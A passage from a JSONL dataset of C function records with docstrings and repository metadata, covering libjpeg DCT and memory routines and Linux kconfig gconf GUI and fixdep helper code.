dataptr[DCTSIZE*1] = z11 + z4;\n    dataptr[DCTSIZE*7] = z11 - z4;\n\n    dataptr++;\t\t\t/* advance pointer to next column */\n  }\n}", "path": "jpeglib\\jfdctflt.c", "repo_name": "erwincoumans/experiments", "stars": 127, "license": "None", "language": "c", "size": 87151}
{"docstring": "/*\n * Initialize coefficient buffer controller.\n */\n", "func_signal": "GLOBAL(void)\njinit_d_coef_controller (j_decompress_ptr cinfo, boolean need_full_buffer)", "code": "{\n  my_coef_ptr coef;\n\n  coef = (my_coef_ptr)\n    (*cinfo->mem->alloc_small) ((j_common_ptr) cinfo, JPOOL_IMAGE,\n\t\t\t\tSIZEOF(my_coef_controller));\n  cinfo->coef = (struct jpeg_d_coef_controller *) coef;\n  coef->pub.start_input_pass = start_input_pass;\n  coef->pub.start_output_pass = start_output_pass;\n#ifdef BLOCK_SMOOTHING_SUPPORTED\n  coef->coef_bits_latch = NULL;\n#endif\n\n  /* Create the coefficient buffer. */\n  if (need_full_buffer) {\n#ifdef D_MULTISCAN_FILES_SUPPORTED\n    /* Allocate a full-image virtual array for each component, */\n    /* padded to a multiple of samp_factor DCT blocks in each direction. */\n    /* Note we ask for a pre-zeroed array. */\n    int ci, access_rows;\n    jpeg_component_info *compptr;\n\n    for (ci = 0, compptr = cinfo->comp_info; ci < cinfo->num_components;\n\t ci++, compptr++) {\n      access_rows = compptr->v_samp_factor;\n#ifdef BLOCK_SMOOTHING_SUPPORTED\n      /* If block smoothing could be used, need a bigger window */\n      if (cinfo->progressive_mode)\n\taccess_rows *= 3;\n#endif\n      coef->whole_image[ci] = (*cinfo->mem->request_virt_barray)\n\t((j_common_ptr) cinfo, JPOOL_IMAGE, TRUE,\n\t (JDIMENSION) jround_up((long) compptr->width_in_blocks,\n\t\t\t\t(long) compptr->h_samp_factor),\n\t (JDIMENSION) jround_up((long) compptr->height_in_blocks,\n\t\t\t\t(long) compptr->v_samp_factor),\n\t (JDIMENSION) access_rows);\n    }\n    coef->pub.consume_data = consume_data;\n    coef->pub.decompress_data = decompress_data;\n    coef->pub.coef_arrays = coef->whole_image; /* link to virtual arrays */\n#else\n    ERREXIT(cinfo, JERR_NOT_COMPILED);\n#endif\n  } else {\n    /* We only need a single-MCU buffer. */\n    JBLOCKROW buffer;\n    int i;\n\n    buffer = (JBLOCKROW)\n      (*cinfo->mem->alloc_large) ((j_common_ptr) cinfo, JPOOL_IMAGE,\n\t\t\t\t  D_MAX_BLOCKS_IN_MCU * SIZEOF(JBLOCK));\n    for (i = 0; i < D_MAX_BLOCKS_IN_MCU; i++) {\n      coef->MCU_buffer[i] = buffer + i;\n    }\n    coef->pub.consume_data = dummy_consume_data;\n    coef->pub.decompress_data = decompress_onepass;\n    coef->pub.coef_arrays = NULL; /* flag for no virtual arrays */\n  }\n}", "path": "jpeglib\\jdcoefct.c", "repo_name": "erwincoumans/experiments", "stars": 127, "license": "None", "language": "c", "size": 87151}
{"docstring": "/*\n * Initialize IDCT manager.\n */\n", "func_signal": "GLOBAL(void)\njinit_inverse_dct (j_decompress_ptr cinfo)", "code": "{\n  my_idct_ptr idct;\n  int ci;\n  jpeg_component_info *compptr;\n\n  idct = (my_idct_ptr)\n    (*cinfo->mem->alloc_small) ((j_common_ptr) cinfo, JPOOL_IMAGE,\n\t\t\t\tSIZEOF(my_idct_controller));\n  cinfo->idct = (struct jpeg_inverse_dct *) idct;\n  idct->pub.start_pass = start_pass;\n\n  for (ci = 0, compptr = cinfo->comp_info; ci < cinfo->num_components;\n       ci++, compptr++) {\n    /* Allocate and pre-zero a multiplier table for each component */\n    compptr->dct_table =\n      (*cinfo->mem->alloc_small) ((j_common_ptr) cinfo, JPOOL_IMAGE,\n\t\t\t\t  SIZEOF(multiplier_table));\n    MEMZERO(compptr->dct_table, SIZEOF(multiplier_table));\n    /* Mark multiplier table not yet set up for any method */\n    idct->cur_method[ci] = -1;\n  }\n}", "path": "jpeglib\\jddctmgr.c", "repo_name": "erwincoumans/experiments", "stars": 127, "license": "None", "language": "c", "size": 87151}
{"docstring": "/*\n * Perform dequantization and inverse DCT on one block of coefficients.\n */\n", "func_signal": "GLOBAL(void)\njpeg_idct_ifast (j_decompress_ptr cinfo, jpeg_component_info * compptr,\n\t\t JCOEFPTR coef_block,\n\t\t JSAMPARRAY output_buf, JDIMENSION output_col)", "code": "{\n  DCTELEM tmp0, tmp1, tmp2, tmp3, tmp4, tmp5, tmp6, tmp7;\n  DCTELEM tmp10, tmp11, tmp12, tmp13;\n  DCTELEM z5, z10, z11, z12, z13;\n  JCOEFPTR inptr;\n  IFAST_MULT_TYPE * quantptr;\n  int * wsptr;\n  JSAMPROW outptr;\n  JSAMPLE *range_limit = IDCT_range_limit(cinfo);\n  int ctr;\n  int workspace[DCTSIZE2];\t/* buffers data between passes */\n  SHIFT_TEMPS\t\t\t/* for DESCALE */\n  ISHIFT_TEMPS\t\t\t/* for IDESCALE */\n\n  /* Pass 1: process columns from input, store into work array. */\n\n  inptr = coef_block;\n  quantptr = (IFAST_MULT_TYPE *) compptr->dct_table;\n  wsptr = workspace;\n  for (ctr = DCTSIZE; ctr > 0; ctr--) {\n    /* Due to quantization, we will usually find that many of the input\n     * coefficients are zero, especially the AC terms.  We can exploit this\n     * by short-circuiting the IDCT calculation for any column in which all\n     * the AC terms are zero.  In that case each output is equal to the\n     * DC coefficient (with scale factor as needed).\n     * With typical images and quantization tables, half or more of the\n     * column DCT calculations can be simplified this way.\n     */\n    \n    if (inptr[DCTSIZE*1] == 0 && inptr[DCTSIZE*2] == 0 &&\n\tinptr[DCTSIZE*3] == 0 && inptr[DCTSIZE*4] == 0 &&\n\tinptr[DCTSIZE*5] == 0 && inptr[DCTSIZE*6] == 0 &&\n\tinptr[DCTSIZE*7] == 0) {\n      /* AC terms all zero */\n      int dcval = (int) DEQUANTIZE(inptr[DCTSIZE*0], quantptr[DCTSIZE*0]);\n\n      wsptr[DCTSIZE*0] = dcval;\n      wsptr[DCTSIZE*1] = dcval;\n      wsptr[DCTSIZE*2] = dcval;\n      wsptr[DCTSIZE*3] = dcval;\n      wsptr[DCTSIZE*4] = dcval;\n      wsptr[DCTSIZE*5] = dcval;\n      wsptr[DCTSIZE*6] = dcval;\n      wsptr[DCTSIZE*7] = dcval;\n      \n      inptr++;\t\t\t/* advance pointers to next column */\n      quantptr++;\n      wsptr++;\n      continue;\n    }\n    \n    /* Even part */\n\n    tmp0 = DEQUANTIZE(inptr[DCTSIZE*0], quantptr[DCTSIZE*0]);\n    tmp1 = DEQUANTIZE(inptr[DCTSIZE*2], quantptr[DCTSIZE*2]);\n    tmp2 = DEQUANTIZE(inptr[DCTSIZE*4], quantptr[DCTSIZE*4]);\n    tmp3 = DEQUANTIZE(inptr[DCTSIZE*6], quantptr[DCTSIZE*6]);\n\n    tmp10 = tmp0 + tmp2;\t/* phase 3 */\n    tmp11 = tmp0 - tmp2;\n\n    tmp13 = tmp1 + tmp3;\t/* phases 5-3 */\n    tmp12 = MULTIPLY(tmp1 - tmp3, FIX_1_414213562) - tmp13; /* 2*c4 */\n\n    tmp0 = tmp10 + tmp13;\t/* phase 2 */\n    tmp3 = tmp10 - tmp13;\n    tmp1 = tmp11 + tmp12;\n    tmp2 = tmp11 - tmp12;\n    \n    /* Odd part */\n\n    tmp4 = DEQUANTIZE(inptr[DCTSIZE*1], quantptr[DCTSIZE*1]);\n    tmp5 = DEQUANTIZE(inptr[DCTSIZE*3], quantptr[DCTSIZE*3]);\n    tmp6 = DEQUANTIZE(inptr[DCTSIZE*5], quantptr[DCTSIZE*5]);\n    tmp7 = DEQUANTIZE(inptr[DCTSIZE*7], quantptr[DCTSIZE*7]);\n\n    z13 = tmp6 + tmp5;\t\t/* phase 6 */\n    z10 = tmp6 - tmp5;\n    z11 = tmp4 + tmp7;\n    z12 = tmp4 - tmp7;\n\n    tmp7 = z11 + z13;\t\t/* phase 5 */\n    tmp11 = MULTIPLY(z11 - z13, FIX_1_414213562); /* 2*c4 */\n\n    z5 = MULTIPLY(z10 + z12, FIX_1_847759065); /* 2*c2 */\n    tmp10 = MULTIPLY(z12, FIX_1_082392200) - z5; /* 2*(c2-c6) */\n    tmp12 = MULTIPLY(z10, - FIX_2_613125930) + z5; /* -2*(c2+c6) */\n\n    tmp6 = tmp12 - tmp7;\t/* phase 2 */\n    tmp5 = tmp11 - tmp6;\n    tmp4 = tmp10 + tmp5;\n\n    wsptr[DCTSIZE*0] = (int) (tmp0 + tmp7);\n    wsptr[DCTSIZE*7] = (int) (tmp0 - tmp7);\n    wsptr[DCTSIZE*1] = (int) (tmp1 + tmp6);\n    wsptr[DCTSIZE*6] = (int) (tmp1 - tmp6);\n    wsptr[DCTSIZE*2] = (int) (tmp2 + tmp5);\n    wsptr[DCTSIZE*5] = (int) (tmp2 - tmp5);\n    wsptr[DCTSIZE*4] = (int) (tmp3 + tmp4);\n    wsptr[DCTSIZE*3] = (int) (tmp3 - tmp4);\n\n    inptr++;\t\t\t/* advance pointers to next column */\n    quantptr++;\n    wsptr++;\n  }\n  \n  /* Pass 2: process rows from work array, store into output array. */\n  /* Note that we must descale the results by a factor of 8 == 2**3, */\n  /* and also undo the PASS1_BITS scaling. */\n\n  wsptr = workspace;\n  for (ctr = 0; ctr < DCTSIZE; ctr++) {\n    outptr = output_buf[ctr] + output_col;\n    /* Rows of zeroes can be exploited in the same way as we did with columns.\n     * However, the column calculation has created many nonzero AC terms, so\n     * the simplification applies less often (typically 5% to 10% of the time).\n     * On machines with very fast multiplication, it's possible that the\n     * test takes more time than it's worth.  In that case this section\n     * may be commented out.\n     */\n    \n#ifndef NO_ZERO_ROW_TEST\n    if (wsptr[1] == 0 && wsptr[2] == 0 && wsptr[3] == 0 && wsptr[4] == 0 &&\n\twsptr[5] == 0 && wsptr[6] == 0 && wsptr[7] == 0) {\n      /* AC terms all zero */\n      JSAMPLE dcval = range_limit[IDESCALE(wsptr[0], PASS1_BITS+3)\n\t\t\t\t  & RANGE_MASK];\n      \n      outptr[0] = dcval;\n      outptr[1] = dcval;\n      outptr[2] = dcval;\n      outptr[3] = dcval;\n      outptr[4] = dcval;\n      outptr[5] = dcval;\n      outptr[6] = dcval;\n      outptr[7] = dcval;\n\n      wsptr += DCTSIZE;\t\t/* advance pointer to next row */\n      continue;\n    }\n#endif\n    \n    /* Even part */\n\n    tmp10 = ((DCTELEM) wsptr[0] + (DCTELEM) wsptr[4]);\n    tmp11 = ((DCTELEM) wsptr[0] - (DCTELEM) wsptr[4]);\n\n    tmp13 = ((DCTELEM) wsptr[2] + (DCTELEM) wsptr[6]);\n    tmp12 = MULTIPLY((DCTELEM) wsptr[2] - (DCTELEM) wsptr[6], FIX_1_414213562)\n\t    - tmp13;\n\n    tmp0 = tmp10 + tmp13;\n    tmp3 = tmp10 - tmp13;\n    tmp1 = tmp11 + tmp12;\n    tmp2 = tmp11 - tmp12;\n\n    /* Odd part */\n\n    z13 = (DCTELEM) wsptr[5] + (DCTELEM) wsptr[3];\n    z10 = (DCTELEM) wsptr[5] - (DCTELEM) wsptr[3];\n    z11 = (DCTELEM) wsptr[1] + (DCTELEM) wsptr[7];\n    z12 = (DCTELEM) wsptr[1] - (DCTELEM) wsptr[7];\n\n    tmp7 = z11 + z13;\t\t/* phase 5 */\n    tmp11 = MULTIPLY(z11 - z13, FIX_1_414213562); /* 2*c4 */\n\n    z5 = MULTIPLY(z10 + z12, FIX_1_847759065); /* 2*c2 */\n    tmp10 = MULTIPLY(z12, FIX_1_082392200) - z5; /* 2*(c2-c6) */\n    tmp12 = MULTIPLY(z10, - FIX_2_613125930) + z5; /* -2*(c2+c6) */\n\n    tmp6 = tmp12 - tmp7;\t/* phase 2 */\n    tmp5 = tmp11 - tmp6;\n    tmp4 = tmp10 + tmp5;\n\n    /* Final output stage: scale down by a factor of 8 and range-limit */\n\n    outptr[0] = range_limit[IDESCALE(tmp0 + tmp7, PASS1_BITS+3)\n\t\t\t    & RANGE_MASK];\n    outptr[7] = range_limit[IDESCALE(tmp0 - tmp7, PASS1_BITS+3)\n\t\t\t    & RANGE_MASK];\n    outptr[1] = range_limit[IDESCALE(tmp1 + tmp6, PASS1_BITS+3)\n\t\t\t    & RANGE_MASK];\n    outptr[6] = range_limit[IDESCALE(tmp1 - tmp6, PASS1_BITS+3)\n\t\t\t    & RANGE_MASK];\n    outptr[2] = range_limit[IDESCALE(tmp2 + tmp5, PASS1_BITS+3)\n\t\t\t    & RANGE_MASK];\n    outptr[5] = range_limit[IDESCALE(tmp2 - tmp5, PASS1_BITS+3)\n\t\t\t    & RANGE_MASK];\n    outptr[4] = range_limit[IDESCALE(tmp3 + tmp4, PASS1_BITS+3)\n\t\t\t    & RANGE_MASK];\n    outptr[3] = range_limit[IDESCALE(tmp3 - tmp4, PASS1_BITS+3)\n\t\t\t    & RANGE_MASK];\n\n    wsptr += DCTSIZE;\t\t/* advance pointer to next row */\n  }\n}", "path": "jpeglib\\jidctfst.c", "repo_name": "erwincoumans/experiments", "stars": 127, "license": "None", "language": "c", "size": 87151}
{"docstring": "/*\n * These routines take care of any system-dependent initialization and\n * cleanup required.\n */\n", "func_signal": "GLOBAL(long)\njpeg_mem_init (j_common_ptr cinfo)", "code": "{\n  next_file_num = 0;\n\n  /* max_memory_to_use will be initialized to FreeMem()'s result;\n   * the calling application might later reduce it, for example\n   * to leave room to invoke multiple JPEG objects.\n   * Note that FreeMem returns the total number of free bytes;\n   * it may not be possible to allocate a single block of this size.\n   */\n  return FreeMem();\n}", "path": "jpeglib\\jmemmac.c", "repo_name": "erwincoumans/experiments", "stars": 127, "license": "None", "language": "c", "size": 87151}
{"docstring": "/*\n * Backing store (temporary file) management.\n * Backing store objects are only used when the value returned by\n * jpeg_mem_available is less than the total space needed.  You can dispense\n * with these routines if you have plenty of virtual memory; see jmemnobs.c.\n */\n", "func_signal": "METHODDEF(void)\nread_backing_store (j_common_ptr cinfo, backing_store_ptr info,\n\t\t    void FAR * buffer_address,\n\t\t    long file_offset, long byte_count)", "code": "{\n  long bytes = byte_count;\n  long retVal;\n\n  if ( SetFPos ( info->temp_file, fsFromStart, file_offset ) != noErr )\n    ERREXIT(cinfo, JERR_TFILE_SEEK);\n\n  retVal = FSRead ( info->temp_file, &bytes,\n\t\t    (unsigned char *) buffer_address );\n  if ( retVal != noErr || bytes != byte_count )\n    ERREXIT(cinfo, JERR_TFILE_READ);\n}", "path": "jpeglib\\jmemmac.c", "repo_name": "erwincoumans/experiments", "stars": 127, "license": "None", "language": "c", "size": 87151}
{"docstring": "/*\n * Initialize for an input processing pass.\n */\n", "func_signal": "METHODDEF(void)\nstart_input_pass (j_decompress_ptr cinfo)", "code": "{\n  cinfo->input_iMCU_row = 0;\n  start_iMCU_row(cinfo);\n}", "path": "jpeglib\\jdcoefct.c", "repo_name": "erwincoumans/experiments", "stars": 127, "license": "None", "language": "c", "size": 87151}
{"docstring": "/*\n * Destruction of a JPEG object.\n *\n * Everything gets deallocated except the master jpeg_compress_struct itself\n * and the error manager struct.  Both of these are supplied by the application\n * and must be freed, if necessary, by the application.  (Often they are on\n * the stack and so don't need to be freed anyway.)\n * Closing a data source or destination, if necessary, is the application's\n * responsibility.\n */\n", "func_signal": "GLOBAL(void)\njpeg_destroy (j_common_ptr cinfo)", "code": "{\n  /* We need only tell the memory manager to release everything. */\n  /* NB: mem pointer is NULL if memory mgr failed to initialize. */\n  if (cinfo->mem != NULL)\n    (*cinfo->mem->self_destruct) (cinfo);\n  cinfo->mem = NULL;\t\t/* be safe if jpeg_destroy is called twice */\n  cinfo->global_state = 0;\t/* mark it destroyed */\n}", "path": "jpeglib\\jcomapi.c", "repo_name": "erwincoumans/experiments", "stars": 127, "license": "None", "language": "c", "size": 87151}
{"docstring": "/* Main Window Initialization */\n", "func_signal": "void init_main_window(const gchar * glade_file)", "code": "{\n\tGladeXML *xml;\n\tGtkWidget *widget;\n\tGtkTextBuffer *txtbuf;\n\tGtkStyle *style;\n\n\txml = glade_xml_new(glade_file, \"window1\", NULL);\n\tif (!xml)\n\t\tg_error(_(\"GUI loading failed !\\n\"));\n\tglade_xml_signal_autoconnect(xml);\n\n\tmain_wnd = glade_xml_get_widget(xml, \"window1\");\n\thpaned = glade_xml_get_widget(xml, \"hpaned1\");\n\tvpaned = glade_xml_get_widget(xml, \"vpaned1\");\n\ttree1_w = glade_xml_get_widget(xml, \"treeview1\");\n\ttree2_w = glade_xml_get_widget(xml, \"treeview2\");\n\ttext_w = glade_xml_get_widget(xml, \"textview3\");\n\n\tback_btn = glade_xml_get_widget(xml, \"button1\");\n\tgtk_widget_set_sensitive(back_btn, FALSE);\n\n\twidget = glade_xml_get_widget(xml, \"show_name1\");\n\tgtk_check_menu_item_set_active((GtkCheckMenuItem *) widget,\n\t\t\t\t       show_name);\n\n\twidget = glade_xml_get_widget(xml, \"show_range1\");\n\tgtk_check_menu_item_set_active((GtkCheckMenuItem *) widget,\n\t\t\t\t       show_range);\n\n\twidget = glade_xml_get_widget(xml, \"show_data1\");\n\tgtk_check_menu_item_set_active((GtkCheckMenuItem *) widget,\n\t\t\t\t       show_value);\n\n\tsave_btn = glade_xml_get_widget(xml, \"button3\");\n\tsave_menu_item = glade_xml_get_widget(xml, \"save1\");\n\tconf_set_changed_callback(conf_changed);\n\n\tstyle = gtk_widget_get_style(main_wnd);\n\twidget = glade_xml_get_widget(xml, \"toolbar1\");\n\n#if 0\t/* Use stock Gtk icons instead */\n\treplace_button_icon(xml, main_wnd->window, style,\n\t\t\t    \"button1\", (gchar **) xpm_back);\n\treplace_button_icon(xml, main_wnd->window, style,\n\t\t\t    \"button2\", (gchar **) xpm_load);\n\treplace_button_icon(xml, main_wnd->window, style,\n\t\t\t    \"button3\", (gchar **) xpm_save);\n#endif\n\treplace_button_icon(xml, main_wnd->window, style,\n\t\t\t    \"button4\", (gchar **) xpm_single_view);\n\treplace_button_icon(xml, main_wnd->window, style,\n\t\t\t    \"button5\", (gchar **) xpm_split_view);\n\treplace_button_icon(xml, main_wnd->window, style,\n\t\t\t    \"button6\", (gchar **) xpm_tree_view);\n\n#if 0\n\tswitch (view_mode) {\n\tcase SINGLE_VIEW:\n\t\twidget = glade_xml_get_widget(xml, \"button4\");\n\t\tg_signal_emit_by_name(widget, \"clicked\");\n\t\tbreak;\n\tcase SPLIT_VIEW:\n\t\twidget = glade_xml_get_widget(xml, \"button5\");\n\t\tg_signal_emit_by_name(widget, \"clicked\");\n\t\tbreak;\n\tcase FULL_VIEW:\n\t\twidget = glade_xml_get_widget(xml, \"button6\");\n\t\tg_signal_emit_by_name(widget, \"clicked\");\n\t\tbreak;\n\t}\n#endif\n\ttxtbuf = gtk_text_view_get_buffer(GTK_TEXT_VIEW(text_w));\n\ttag1 = gtk_text_buffer_create_tag(txtbuf, \"mytag1\",\n\t\t\t\t\t  \"foreground\", \"red\",\n\t\t\t\t\t  \"weight\", PANGO_WEIGHT_BOLD,\n\t\t\t\t\t  NULL);\n\ttag2 = gtk_text_buffer_create_tag(txtbuf, \"mytag2\",\n\t\t\t\t\t  /*\"style\", PANGO_STYLE_OBLIQUE, */\n\t\t\t\t\t  NULL);\n\n\tgtk_window_set_title(GTK_WINDOW(main_wnd), rootmenu.prompt->text);\n\n\tgtk_widget_show(main_wnd);\n}", "path": "scripts\\kconfig\\gconf.c", "repo_name": "masahir0y/kbuild_skeleton", "stars": 85, "license": "gpl-2.0", "language": "c", "size": 340}
{"docstring": "/* Main */\n", "func_signal": "int main(int ac, char *av[])", "code": "{\n\tconst char *name;\n\tchar *env;\n\tgchar *glade_file;\n\n#ifndef LKC_DIRECT_LINK\n\tkconfig_load();\n#endif\n\n\tbindtextdomain(PACKAGE, LOCALEDIR);\n\tbind_textdomain_codeset(PACKAGE, \"UTF-8\");\n\ttextdomain(PACKAGE);\n\n\t/* GTK stuffs */\n\tgtk_set_locale();\n\tgtk_init(&ac, &av);\n\tglade_init();\n\n\t//add_pixmap_directory (PACKAGE_DATA_DIR \"/\" PACKAGE \"/pixmaps\");\n\t//add_pixmap_directory (PACKAGE_SOURCE_DIR \"/pixmaps\");\n\n\t/* Determine GUI path */\n\tenv = getenv(SRCTREE);\n\tif (env)\n\t\tglade_file = g_strconcat(env, \"/scripts/kconfig/gconf.glade\", NULL);\n\telse if (av[0][0] == '/')\n\t\tglade_file = g_strconcat(av[0], \".glade\", NULL);\n\telse\n\t\tglade_file = g_strconcat(g_get_current_dir(), \"/\", av[0], \".glade\", NULL);\n\n\t/* Conf stuffs */\n\tif (ac > 1 && av[1][0] == '-') {\n\t\tswitch (av[1][1]) {\n\t\tcase 'a':\n\t\t\t//showAll = 1;\n\t\t\tbreak;\n\t\tcase 'h':\n\t\tcase '?':\n\t\t\tprintf(\"%s <config>\\n\", av[0]);\n\t\t\texit(0);\n\t\t}\n\t\tname = av[2];\n\t} else\n\t\tname = av[1];\n\n\tconf_parse(name);\n\tfixup_rootmenu(&rootmenu);\n\tconf_read(NULL);\n\n\t/* Load the interface and connect signals */\n\tinit_main_window(glade_file);\n\tinit_tree_model();\n\tinit_left_tree();\n\tinit_right_tree();\n\n\tswitch (view_mode) {\n\tcase SINGLE_VIEW:\n\t\tdisplay_tree_part();\n\t\tbreak;\n\tcase SPLIT_VIEW:\n\t\tdisplay_list();\n\t\tbreak;\n\tcase FULL_VIEW:\n\t\tdisplay_tree(&rootmenu);\n\t\tbreak;\n\t}\n\n\tgtk_main();\n\n\treturn 0;\n}", "path": "scripts\\kconfig\\gconf.c", "repo_name": "masahir0y/kbuild_skeleton", "stars": 85, "license": "gpl-2.0", "language": "c", "size": 340}
{"docstring": "/* Set the node content with a row of strings */\n", "func_signal": "static void set_node(GtkTreeIter * node, struct menu *menu, gchar ** row)", "code": "{\n\tGdkColor color;\n\tgboolean success;\n\tGdkPixbuf *pix;\n\n\tpix = gdk_pixbuf_new_from_xpm_data((const char **)\n\t\t\t\t\t   row[COL_PIXBUF]);\n\n\tgdk_color_parse(row[COL_COLOR], &color);\n\tgdk_colormap_alloc_colors(gdk_colormap_get_system(), &color, 1,\n\t\t\t\t  FALSE, FALSE, &success);\n\n\tgtk_tree_store_set(tree, node,\n\t\t\t   COL_OPTION, row[COL_OPTION],\n\t\t\t   COL_NAME, row[COL_NAME],\n\t\t\t   COL_NO, row[COL_NO],\n\t\t\t   COL_MOD, row[COL_MOD],\n\t\t\t   COL_YES, row[COL_YES],\n\t\t\t   COL_VALUE, row[COL_VALUE],\n\t\t\t   COL_MENU, (gpointer) menu,\n\t\t\t   COL_COLOR, &color,\n\t\t\t   COL_EDIT, GPOINTER_TO_INT(row[COL_EDIT]),\n\t\t\t   COL_PIXBUF, pix,\n\t\t\t   COL_PIXVIS, GPOINTER_TO_INT(row[COL_PIXVIS]),\n\t\t\t   COL_BTNVIS, GPOINTER_TO_INT(row[COL_BTNVIS]),\n\t\t\t   COL_BTNACT, GPOINTER_TO_INT(row[COL_BTNACT]),\n\t\t\t   COL_BTNINC, GPOINTER_TO_INT(row[COL_BTNINC]),\n\t\t\t   COL_BTNRAD, GPOINTER_TO_INT(row[COL_BTNRAD]),\n\t\t\t   -1);\n\n\tg_object_unref(pix);\n}", "path": "scripts\\kconfig\\gconf.c", "repo_name": "masahir0y/kbuild_skeleton", "stars": 85, "license": "gpl-2.0", "language": "c", "size": 340}
{"docstring": "/*\n * Add a new value to the configuration string.\n */\n", "func_signal": "static void define_config(const char *name, int len, unsigned int hash)", "code": "{\n\tstruct item *aux = malloc(sizeof(*aux) + len);\n\n\tif (!aux) {\n\t\tperror(\"fixdep:malloc\");\n\t\texit(1);\n\t}\n\tmemcpy(aux->name, name, len);\n\taux->len = len;\n\taux->hash = hash;\n\taux->next = hashtab[hash % HASHSZ];\n\thashtab[hash % HASHSZ] = aux;\n}", "path": "scripts\\basic\\fixdep.c", "repo_name": "masahir0y/kbuild_skeleton", "stars": 85, "license": "gpl-2.0", "language": "c", "size": 340}
{"docstring": "/*\n * Lookup a value in the configuration string.\n */\n", "func_signal": "static int is_defined_config(const char *name, int len, unsigned int hash)", "code": "{\n\tstruct item *aux;\n\n\tfor (aux = hashtab[hash % HASHSZ]; aux; aux = aux->next) {\n\t\tif (aux->hash == hash && aux->len == len &&\n\t\t    memcmp(aux->name, name, len) == 0)\n\t\t\treturn 1;\n\t}\n\treturn 0;\n}", "path": "scripts\\basic\\fixdep.c", "repo_name": "masahir0y/kbuild_skeleton", "stars": 85, "license": "gpl-2.0", "language": "c", "size": 340}
{"docstring": "/* Row selection changed: update help */\n", "func_signal": "void\non_treeview2_cursor_changed(GtkTreeView * treeview, gpointer user_data)", "code": "{\n\tGtkTreeSelection *selection;\n\tGtkTreeIter iter;\n\tstruct menu *menu;\n\n\tselection = gtk_tree_view_get_selection(treeview);\n\tif (gtk_tree_selection_get_selected(selection, &model2, &iter)) {\n\t\tgtk_tree_model_get(model2, &iter, COL_MENU, &menu, -1);\n\t\ttext_insert_help(menu);\n\t}\n}", "path": "scripts\\kconfig\\gconf.c", "repo_name": "masahir0y/kbuild_skeleton", "stars": 85, "license": "gpl-2.0", "language": "c", "size": 340}
{"docstring": "/*\n * Clear the set of configuration strings.\n */\n", "func_signal": "static void clear_config(void)", "code": "{\n\tstruct item *aux, *next;\n\tunsigned int i;\n\n\tfor (i = 0; i < HASHSZ; i++) {\n\t\tfor (aux = hashtab[i]; aux; aux = next) {\n\t\t\tnext = aux->next;\n\t\t\tfree(aux);\n\t\t}\n\t\thashtab[i] = NULL;\n\t}\n}", "path": "scripts\\basic\\fixdep.c", "repo_name": "masahir0y/kbuild_skeleton", "stars": 85, "license": "gpl-2.0", "language": "c", "size": 340}
{"docstring": "/* Key pressed: update choice */\n", "func_signal": "gboolean\non_treeview2_key_press_event(GtkWidget * widget,\n\t\t\t     GdkEventKey * event, gpointer user_data)", "code": "{\n\tGtkTreeView *view = GTK_TREE_VIEW(widget);\n\tGtkTreePath *path;\n\tGtkTreeViewColumn *column;\n\tGtkTreeIter iter;\n\tstruct menu *menu;\n\tgint col;\n\n\tgtk_tree_view_get_cursor(view, &path, &column);\n\tif (path == NULL)\n\t\treturn FALSE;\n\n\tif (event->keyval == GDK_space) {\n\t\tif (gtk_tree_view_row_expanded(view, path))\n\t\t\tgtk_tree_view_collapse_row(view, path);\n\t\telse\n\t\t\tgtk_tree_view_expand_row(view, path, FALSE);\n\t\treturn TRUE;\n\t}\n\tif (event->keyval == GDK_KP_Enter) {\n\t}\n\tif (widget == tree1_w)\n\t\treturn FALSE;\n\n\tgtk_tree_model_get_iter(model2, &iter, path);\n\tgtk_tree_model_get(model2, &iter, COL_MENU, &menu, -1);\n\n\tif (!strcasecmp(event->string, \"n\"))\n\t\tcol = COL_NO;\n\telse if (!strcasecmp(event->string, \"m\"))\n\t\tcol = COL_MOD;\n\telse if (!strcasecmp(event->string, \"y\"))\n\t\tcol = COL_YES;\n\telse\n\t\tcol = -1;\n\tchange_sym_value(menu, col);\n\n\treturn FALSE;\n}", "path": "scripts\\kconfig\\gconf.c", "repo_name": "masahir0y/kbuild_skeleton", "stars": 85, "license": "gpl-2.0", "language": "c", "size": 340}
{"docstring": "/* Add a node to the tree */\n", "func_signal": "static void place_node(struct menu *menu, char **row)", "code": "{\n\tGtkTreeIter *parent = parents[indent - 1];\n\tGtkTreeIter *node = parents[indent];\n\n\tgtk_tree_store_append(tree, node, parent);\n\tset_node(node, menu, row);\n}", "path": "scripts\\kconfig\\gconf.c", "repo_name": "masahir0y/kbuild_skeleton", "stars": 85, "license": "gpl-2.0", "language": "c", "size": 340}
{"docstring": "/*\n * Find a menu in the GtkTree starting at parent.\n */\n", "func_signal": "GtkTreeIter *gtktree_iter_find_node(GtkTreeIter * parent,\n\t\t\t\t    struct menu *tofind)", "code": "{\n\tGtkTreeIter iter;\n\tGtkTreeIter *child = &iter;\n\tgboolean valid;\n\tGtkTreeIter *ret;\n\n\tvalid = gtk_tree_model_iter_children(model2, child, parent);\n\twhile (valid) {\n\t\tstruct menu *menu;\n\n\t\tgtk_tree_model_get(model2, child, 6, &menu, -1);\n\n\t\tif (menu == tofind) {\n\t\t\tmemcpy(&found, child, sizeof(GtkTreeIter));\n\t\t\treturn &found;\n\t\t}\n\n\t\tret = gtktree_iter_find_node(child, tofind);\n\t\tif (ret)\n\t\t\treturn ret;\n\n\t\tvalid = gtk_tree_model_iter_next(model2, child);\n\t}\n\n\treturn NULL;\n}", "path": "scripts\\kconfig\\gconf.c", "repo_name": "masahir0y/kbuild_skeleton", "stars": 85, "license": "gpl-2.0", "language": "c", "size": 340}
{"docstring": "/* Utility Functions */\n", "func_signal": "static void text_insert_help(struct menu *menu)", "code": "{\n\tGtkTextBuffer *buffer;\n\tGtkTextIter start, end;\n\tconst char *prompt = _(menu_get_prompt(menu));\n\tstruct gstr help = str_new();\n\n\tmenu_get_ext_help(menu, &help);\n\n\tbuffer = gtk_text_view_get_buffer(GTK_TEXT_VIEW(text_w));\n\tgtk_text_buffer_get_bounds(buffer, &start, &end);\n\tgtk_text_buffer_delete(buffer, &start, &end);\n\tgtk_text_view_set_left_margin(GTK_TEXT_VIEW(text_w), 15);\n\n\tgtk_text_buffer_get_end_iter(buffer, &end);\n\tgtk_text_buffer_insert_with_tags(buffer, &end, prompt, -1, tag1,\n\t\t\t\t\t NULL);\n\tgtk_text_buffer_insert_at_cursor(buffer, \"\\n\\n\", 2);\n\tgtk_text_buffer_get_end_iter(buffer, &end);\n\tgtk_text_buffer_insert_with_tags(buffer, &end, str_get(&help), -1, tag2,\n\t\t\t\t\t NULL);\n\tstr_free(&help);\n}", "path": "scripts\\kconfig\\gconf.c", "repo_name": "masahir0y/kbuild_skeleton", "stars": 85, "license": "gpl-2.0", "language": "c", "size": 